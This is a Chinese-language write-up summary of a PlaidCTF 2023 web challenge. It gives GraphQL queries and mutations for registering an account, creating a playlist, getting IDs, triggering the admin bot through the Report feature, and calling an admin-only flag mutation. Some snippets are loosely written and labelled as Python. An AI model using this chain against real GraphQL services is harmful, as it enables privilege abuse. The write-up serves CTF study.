---
title: PlaidCTF 2023 Writeup
contest: PlaidCTF 2023
year: 2023
difficulty: medium
vuln_type: web_unknown
tags: [GraphQL_introspection, register_mutation, createPlaylist_mutation, Report_URL_XSS, admin_bot, plai_id_introspection]
attack_chain:
  - 注册账号：mutation Register { register(name, password) }
  - 创建 playlist：mutation CreatePlaylist { createPlaylist }
  - GraphQL introspection 查询 playlist.id + owner.id
  - 拼 URL：/user/<user_id> 上 Report 触发 admin bot
  - admin_token 拿 flag：mutation Flag { flag }
key_payload: 'mutation Flag { flag }'
one_liner: PlaidCTF 2023 putlocker：GraphQL 注册+Report XSS+admin bot+flag mutation。
lesson: GraphQL 漏洞常结合 XSS/CSRF；mutation Flag 需要 admin_token；introspection 拿 ID。
quality: medium
---

# PlaidCTF 2023 Writeup

## 来源
- 原文：ctfiot.com/108761.html
- 比赛：PlaidCTF 2023

## 攻击链

### 1. 注册账号
```python
mutation Register { register(name: "user", password: "pass") }
```

### 2. 创建 playlist
```python
mutation CreatePlaylist { createPlaylist(name: "attack!", description: "") { id __typename } }
```

### 3. GraphQL introspection 拿 owner.id
```python
query PlaylistQuery {
    playlist(id: "<playlist_id>") {
        id name description
        episodes { id name __typename }
        owner { id name __typename }
        __typename
    }
}
```

### 4. Report URL 触发 admin bot
```python
sent_url = host + '/user/' + user_id
mutation Report { report(url: sent_url) }
```

### 5. admin_token 拿 flag
```python
admin_token = input('Enter admin_token: ')
mutation Flag { flag }  # 用 admin_token 调用
```

## 关键技巧
- **GraphQL introspection**：查字段类型 + 用户 ID
- **admin bot XSS/CSRF**：经典 Report 触发
- **mutation Flag**：管理员专用 flag mutation

## 适用场景
- GraphQL 漏洞利用
- 越权 mutation 调用
- admin bot 触发 XSS
